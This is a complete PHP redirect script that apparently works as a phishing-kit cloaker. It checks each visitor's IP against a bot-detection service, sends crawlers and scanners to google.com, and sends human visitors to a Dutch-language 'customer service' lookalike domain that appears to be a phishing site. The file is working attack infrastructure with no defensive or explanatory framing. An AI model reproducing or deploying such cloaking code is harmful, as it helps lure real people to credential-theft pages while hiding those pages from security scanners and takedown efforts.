<?php

if (is_bot(get_client_ip())) {
    header('Location: https://google.com');
    die();
} else {
    header("Location: https://ondersteuning-klantenservice.cloudaccess.host/main/arg");
}
 

    
function get_client_ip() {
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    if(filter_var($client, FILTER_VALIDATE_IP)) {
        $ip = $client;
    } else if(filter_var($forward, FILTER_VALIDATE_IP)) {
        $ip = $forward;
    } else {
        $ip = $remote;
    }
    if( $ip == '::1' ) {
        return '127.0.0.1';
    }
    return  $ip;
}    
function is_bot($ip)
{
        $url = "https://blackbox.ipinfo.app/lookup/".$ip;
        $ch = curl_init();
        curl_setopt($ch,CURLOPT_URL,$url);
        curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $resp = curl_exec($ch);
        curl_close($ch);
        
        if ($resp === "Y") {
            return true;
        }
        return false;
}
?>